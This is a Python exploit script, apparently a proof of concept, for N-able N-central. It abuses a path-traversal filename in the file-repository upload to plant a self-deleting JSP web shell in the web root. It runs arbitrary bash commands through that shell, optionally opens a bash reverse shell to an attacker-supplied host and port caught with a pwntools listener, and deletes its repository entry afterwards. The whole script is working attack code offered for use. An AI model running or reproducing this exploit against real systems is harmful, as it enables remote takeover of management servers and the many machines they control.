#!/usr/bin/env python3
import argparse
import getpass
import json
import os
import secrets

import requests
import urllib3


def main():
    p = argparse.ArgumentParser(description="N-central file-repository filename traversal RCE")
    p.add_argument("--target", default="https://192.168.1.14:8443")
    p.add_argument("--username", default="productadmin@n-able.com")
    p.add_argument("--password", default=os.getenv("PRODUCTADMIN_PASSWORD"))
    p.add_argument("--command", default="/usr/bin/id")
    p.add_argument("--lhost")
    p.add_argument("--lport", type=int, default=4444)
    p.add_argument("--listen-host", default="0.0.0.0")
    a = p.parse_args()
    password = a.password or getpass.getpass("Password: ")
    command = a.command
    receiver = None
    if a.lhost:
        from pwn import context, listen

        context.log_level = "error"
        receiver = listen(a.lport, bindaddr=a.listen_host, timeout=60)
        command = f"nohup bash -c 'bash -i >& /dev/tcp/{a.lhost}/{a.lport} 0>&1' >/dev/null 2>&1 & echo connected"

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    target = a.target.rstrip("/")
    s = requests.Session()
    s.verify = False
    s.get(target + "/login", timeout=30)
    login = s.post(
        target + "/loginLoginAction.action",
        data={"username": a.username, "password": password, "customerId": "1", "soName": ""},
        allow_redirects=False,
        timeout=30,
    )
    if login.status_code != 302:
        raise SystemExit(f"login={login.status_code}")

    suffix = secrets.token_hex(5)
    tab = "repo-" + suffix
    name = "nc_" + suffix + ".jsp"
    jsp = (
        '<%@ page contentType="text/plain;charset=UTF-8" import="java.nio.charset.StandardCharsets" %><%'
        f'String c={json.dumps(command)};'
        'new java.io.File(application.getRealPath(request.getServletPath())).delete();'
        'Process p=new ProcessBuilder("/bin/bash","-c",c).redirectErrorStream(true).start();'
        'byte[] b=p.getInputStream().readAllBytes();p.waitFor();'
        'out.print(new String(b,StandardCharsets.UTF_8));%>'
    ).encode()
    headers = {"X-Requested-With": "XMLHttpRequest", "ncentralTabId": tab}
    s.get(
        target + "/refreshNavAction.action",
        headers=headers,
        params={"ncentralTabId": tab, "custId": "1", "custName": "System"},
        timeout=30,
    )
    s.get(
        target + "/addFileRepositoryAction.action",
        headers=headers,
        params={
            "ncentralTabId": tab,
            "repositoryType": "Script",
            "repositoryTypeDescription": "Scripting",
            "customInterface": "",
        },
        timeout=30,
    )
    upload = s.post(
        target + "/saveFileRepositoryAction.action",
        headers=headers,
        data={
            "ncentralTabId": tab,
            "repositoryName": "Upload" + suffix,
            "description": "",
            "repositoryId": "-1",
            "repositoryType": "Script",
            "fileOrigin": "UPLOAD",
            "commandParameters": "none",
        },
        files={
            "itemFileFiled": (
                "../../../../../opt/nable/webapps/ROOT/tmp/" + name,
                jsp,
                "application/octet-stream",
            )
        },
        timeout=60,
    )
    listing = s.post(
        target + "/updateFilterFileRepositoryAction.action",
        headers=headers,
        data={"filter.searchTerm": "Upload" + suffix},
        timeout=30,
    )
    listing.raise_for_status()
    matches = [item for item in listing.json()["listData"] if item["name"] == "Upload" + suffix]
    if len(matches) != 1:
        raise RuntimeError("uploaded repository item not found")
    try:
        result = s.get(target + "/tmp/" + name, timeout=120)
    finally:
        delete = s.post(
            target + "/deleteFileRepositoryAction.action",
            headers=headers,
            data={"selectedGroup": str(matches[0]["itemId"])},
            timeout=60,
        )
        delete.raise_for_status()
        remaining = s.post(
            target + "/updateFilterFileRepositoryAction.action",
            headers=headers,
            data={"filter.searchTerm": "Upload" + suffix},
            timeout=30,
        ).json()["listData"]
        if any(item["name"] == "Upload" + suffix for item in remaining):
            raise RuntimeError("repository cleanup failed")
    print(f"login={login.status_code}")
    print(f"upload={upload.status_code}")
    print(f"execute={result.status_code}")
    if receiver:
        receiver.wait_for_connection()
        if receiver.sock is None:
            raise RuntimeError("reverse shell was not received")
        receiver.interactive()
    elif result.text:
        print(result.text.strip())


if __name__ == "__main__":
    main()
